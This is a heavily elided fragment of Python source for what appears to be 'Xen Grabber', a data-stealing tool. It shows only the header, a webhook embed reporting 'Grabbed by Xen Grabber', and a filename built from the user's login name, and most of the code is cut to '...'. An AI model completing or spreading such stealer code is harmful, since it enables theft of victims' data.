# Python 3.10+
# Author: xen-light
# Github: https://github.com/xen-light/xengrabberV2
# Encoding: UTF-8
...
class XenGrabber:
  ...
  "embeds": [
    {
      ...
      "url": "https://github.com/xen-light/xengrabberV2",
      "color": 34303,
      "footer": {
        "text": "Grabbed by Xen Grabber | https://github.com/xen-light/xengrabberV2"
      },
      "thumbnail": {
        "url": image_url
      }
  ...
  "username" : "Xen Grabber",
  "avatar_url" : image_url
}

            filename = "Xen-{}.{}".format(os.getlogin(), extention)
